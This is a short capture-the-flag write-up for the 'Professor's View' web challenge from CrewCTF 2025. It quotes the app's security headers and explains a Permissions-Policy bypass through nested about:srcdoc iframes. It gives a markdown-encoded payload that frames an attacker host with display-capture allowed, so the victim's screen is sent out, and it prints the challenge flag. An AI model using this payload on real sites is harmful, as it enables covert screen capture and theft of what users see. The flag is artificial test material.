# Professor's View — CrewCTF 2025

> **Room / Challenge:** Professor's View (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** CrewCTF 2025
- **Challenge:** Professor's View (web)
- **Target / URL:** `https://professors-view.chal.crewc.tf/`
- **Difficulty:** `Hard`
- **Points:** `477`
- **Tags:** web, xss, sqli, auth, enumeration
- **Date:** `21-09-2025`

---

## Goal

We have to get the flag of the Professor which is showned in his dashboard.

## My Solution

Here is the [Source Code](./professor-view.tar.gz)

Unlike Hate Notes and Love Notes, Professor's View response is set:

```
Content-Security-Policy: script-src 'self' https://js.hcaptcha.com/1/api.js; style-src 'self'; img-src 'self'; font-src 'none'; connect-src 'none'; media-src 'none'; object-src 'none'; prefetch-src 'none'; frame-ancestors 'none'; form-action 'self';
```

So from now on we can skip the XSS and CSS Exfiltration.

You can read full write-up of the author `bubu` [here](https://albertofdr.github.io/post/crewctf-2025/)

But I have the base idea:

The app has a route `/profmeet` which should be used to create meetings or calls. That can explain why the `Permissions-Policy` has `self` value for `camera`, `display-capture`.

```javascript
// Middleware to add security headers to all responses
app.use((req, res, next) => {
  // Prevent any attack
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "DENY");
  res.setHeader(
    "Content-Security-Policy",
    "script-src 'self' https://js.hcaptcha.com/1/api.js; style-src 'self'; img-src 'self'; font-src 'none'; connect-src 'none'; media-src 'none'; object-src 'none'; prefetch-src 'none'; frame-ancestors 'none'; form-action 'self';"
  );
  res.setHeader("Referrer-Policy", "no-referrer");
  res.setHeader(
    "Permissions-Policy",
    "accelerometer=(),attribution-reporting=(),autoplay=(),browsing-topics=(),camera=self,captured-surface-control=(),ch-device-memory=(),ch-downlink=(),ch-dpr=(),ch-ect=(),ch-prefers-color-scheme=(),ch-prefers-reduced-motion=(),ch-rtt=(),ch-save-data=(),ch-ua=(),ch-ua-arch=(),ch-ua-bitness=(),ch-ua-form-factors=(),ch-ua-full-version=(),ch-ua-full-version-list=(),ch-ua-mobile=(),ch-ua-model=(),ch-ua-platform=(),ch-ua-platform-version=(),ch-ua-wow64=(),ch-viewport-height=(),ch-viewport-width=(),ch-width=(),clipboard-read=(),clipboard-write=(),compute-pressure=(),cross-origin-isolated=(),deferred-fetch=(),digital-credentials-get=(),display-capture=self,encrypted-media=(),ethereum=(),fullscreen=(),gamepad=(),geolocation=(),gyroscope=(),hid=(),identity-credentials-get=(),idle-detection=(),join-ad-interest-group=(),keyboard-map=(),local-fonts=(),magnetometer=(),microphone=self,midi=(),otp-credentials=(),payment=(),picture-in-picture=(),private-aggregation=(),private-state-token-issuance=(),private-state-token-redemption=(),publickey-credentials-create=(),publickey-credentials-get=(),run-ad-auction=(),screen-wake-lock=(),serial=(),shared-storage=(),shared-storage-select-url=(),solana=(),storage-access=(),sync-xhr=(),unload=(),usb=(),window-management=(),xr-spatial-tracking=()"
  );
  res.setHeader("Cache-Control", "no-store");
  next();
});
```

There is a bypass method by using `about:srcdoc` headerless document which do not produce HTTP requests and therefore lack response headers. The payload will be constructed like this: `<iframe srcdoc="<iframe src='https://ATTACKER.com' allow='display-capture'></iframe>"></iframe>`.

In the markdown, that payload will become `&[a[srcdoc=&lt;iframe/src=&apos;https://ATTACKER.COM&apos;/allow=display-capture&gt; ](a)](a)`, because markdown blocks `<` and `>`. So we can make a complain with that payload and get the screenshot in our server.

You can view the `server.js` created by `bubu` [here](https://github.com/AlbertoFDR/CTF/blob/main/created-challs/CrewCTF-2025/professors-view/solution/server.js)

![Guide image](./screenshots/professor-view-1.webp)

We can get the flag: `crew{permissions_are_fun_even_that_people_dont_really_care_1a3b7c9d}`

## Lessons Learned

- Markdown Exploit
- Beyond XSS Exploitation
